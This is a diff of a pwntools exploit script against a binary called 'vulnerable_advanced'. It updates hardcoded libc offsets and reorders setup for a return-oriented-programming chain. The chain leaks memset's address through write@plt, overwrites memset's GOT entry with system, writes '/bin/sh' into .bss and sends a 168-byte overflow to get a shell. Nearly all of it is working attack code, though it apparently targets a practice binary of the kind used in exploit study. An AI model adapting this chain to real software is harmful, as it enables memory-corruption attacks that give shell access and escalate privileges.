@@ -3,10 +3,6 @@
 from pwn import *
 from struct import pack, unpack
 
-vuln = ELF('./vulnerable_advanced')
-context.binary = './vulnerable_advanced'
-r = vuln.process()
-
 write_plt    = 0x401080         # address of write@plt
 read_plt     = 0x4010c0         # address of read@plt
 memset_plt   = 0x4010b0         # address of memset@plt
@@ -14,17 +10,14 @@ memset_got   = 0x404030         # memset()'s GOT entry
 setbuf_plt   = 0x401090         # address of setbuf@plt
 setbuf_got   = 0x404020         # setbuf()'s GOT entry
 pop3ret      = 0x4011be         # gadget to pop rdi; pop rsi; pop rdx; ret (from helper function)
-memset_off   = 0x18efc0         # memset()'s offset in libc.so.6 (here: __memset_avx2_unaligned)
-system_off   = 0x0554e0         # system()'s offset in libc.so.6
-setreuid_off = 0x117c20         # setreuid()'s offset in libc.so.6
-binsh_off    = 0x1b6613         # "/bin/sh" offset in libc.so.6 (not used)
+memset_off   = 0x18e900         # memset()'s offset in libc.so.6 (here: __memset_avx2_unaligned)
+system_off   = 0x055410         # system()'s offset in libc.so.6
+setreuid_off = 0x117920         # setreuid()'s offset in libc.so.6
 writeable    = 0x404058         # location to write "/bin/sh" to (here: location in .bss section)
 
 # Padding
 buf = bytearray()
-buf += bytes(
-    'A'*168,
-    encoding='ascii')           # padding to RIP's offset (152 for aligned buffer, 8 for ssize_t b, 8 for saved frame pointer)
+buf += b'A' * 168               # padding to RIP's offset (152 for aligned buffer, 8 for ssize_t b, 8 for saved frame pointer)
 
 # Leak memset()'s libc address using write@plt (memset() is __memset_avx_unaligned() here)
 buf += pack('<Q', pop3ret)      # pop args into registers
@@ -65,6 +58,10 @@ buf += pack('<Q', writeable)    # address of "/bin/sh"
 buf += pack('<Q', 0x1)          # junk
 buf += pack('<Q', 0x1)          # junk
 buf += pack('<Q', memset_plt)   # return to memset@plt which due to memset@got.plt pointing to system is actually system() now
+
+vuln = ELF('./vulnerable_advanced')
+context.binary = './vulnerable_advanced'
+r = vuln.process()
 
 # Stage 1: leak memset address
 r.send(buf)                     # send buf to overwrite RIP
